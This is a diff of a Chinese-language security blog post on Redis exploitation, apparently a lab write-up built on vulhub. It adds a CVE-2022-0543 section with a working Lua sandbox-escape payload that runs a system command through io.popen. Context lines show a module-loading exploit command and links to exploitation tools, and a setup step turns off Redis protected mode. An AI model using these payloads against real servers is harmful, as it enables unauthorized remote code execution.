@@ -439,14 +439,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-03-16
+                    2022-03-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.2k
+                    5.4k
                 </div>
                 
 
@@ -496,7 +496,7 @@ $ tar xzf redis-6.2.6.tar.gz
 $ cd redis-6.2.6
 $ make
 $ cd src &amp;&amp; ./redis-server</code></pre>
-<p>修改默认配置文件关闭保护模式并绑定IP（<code>bind 0.0.0.0 ，protected-mode no</code>）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1b3d18fc3a70f386bc757c326cc141d7.png"><br>加载配置文件启动<code>./redis-server ../redis.conf</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f226ac8aaadcc072a6caf5ac22e8e01e.png"></p>
+<p>修改默认配置文件，配置文件就在redis-6.2.6目录下，在配置里关闭保护模式并绑定IP（<code>bind 0.0.0.0 ，protected-mode no</code>）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1b3d18fc3a70f386bc757c326cc141d7.png"><br>加载配置文件启动<code>./redis-server ../redis.conf</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f226ac8aaadcc072a6caf5ac22e8e01e.png"></p>
 <p>4.Docker 环境<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">vulhub</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed8fb9d44d975a36d16033f3a26f3ab3.png"></p>
 <p><a target="_blank" rel="noopener" href="https://hub.docker.com/_/redis">dockerhub-redis</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p>
 <pre><code class="line-numbers language-bash">docker pull redis:5-bullseye</code></pre>
@@ -770,6 +770,9 @@ system.exec 'id'
 <pre><code class="line-numbers language-python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 --lport 16379 --rpath "/tmp" --rfile system.so --lfile system.so</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
 <p>Windows版本用于执行命令的模块：<a target="_blank" rel="noopener" href="https://github.com/0671/RedisModules-ExecuteCommand-for-Windows">RedisModules-ExecuteCommand-for-Windows</a> ：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/60da50d286254d094d975df3f6eceaa3.png"><br>同时这位师傅已经开发出了完整的利用工具：<a target="_blank" rel="noopener" href="https://github.com/0671/RabR">RabR</a></p>
+<h3 id="0x03-5-CVE-2022-0543"><a href="#0x03-5-CVE-2022-0543" class="headerlink" title="0x03-5 CVE-2022-0543"></a>0x03-5 CVE-2022-0543</h3><p>CVE-2022-0543是一个在Debian和Debian衍生的 Linux发行版Redis沙盒逃逸漏洞，具体可见<a target="_blank" rel="noopener" href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce">发现者博客</a>。这并不是Redis的漏洞，在Debian及其衍生版本在发布源打包Redis时，存在一个没有处理的package对象，通过该对象的luaLoadLib方法加载外部Lua库，从而进行沙盒逃逸。使用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543">vulhub</a>搭建环境，通过POC验证:</p>
+<pre><code class="line-numbers language-lua">eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/27206907a84a9564f4f2b66893d20959.png"></p>
 <h2 id="0x04-文末总结"><a href="#0x04-文末总结" class="headerlink" title="0x04 文末总结"></a>0x04 文末总结</h2><p>通过整理Redis漏洞相关资料后总结：Redis在&lt;3.2.0版本上默认配置上存在未授权漏洞，后续版本如果配置错误也会存在问题。针对未授权主要利用rdb数据库文件写入、主从复制写入和模块加载来利用，同时发现结合AOF配置可以进行自动写shell的方法。针对windows上dll劫持的利用也进行了深入分析，达到比较完美的利用。更是发现了GitHub上几位师傅开发的工具，利用起来非常方便。最后在使用脚本之前一定要注意数据的备份方便后续恢复。</p>
 <h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br><a target="_blank" rel="noopener" href="https://github.com/0671/RabR">https://github.com/0671/RabR</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5366.html">https://www.secpulse.com/archives/5366.html</a><br><a target="_blank" rel="noopener" href="https://blog.xray.cool/post/learning-redis-security/">https://blog.xray.cool/post/learning-redis-security/</a><br><a target="_blank" rel="noopener" href="https://jkme.github.io/redis-on-windows-dll-hijack.html">https://jkme.github.io/redis-on-windows-dll-hijack.html</a><br><a href="https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/">https://yanghaoi.github.io/2021/10/07/ssrf-lou-dong-ji-chu/</a></p>
 <script>
@@ -1431,7 +1434,7 @@ system.exec 'id'
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.1k</span>&nbsp;字
+                class="white-color">44.3k</span>&nbsp;字
             
             
             
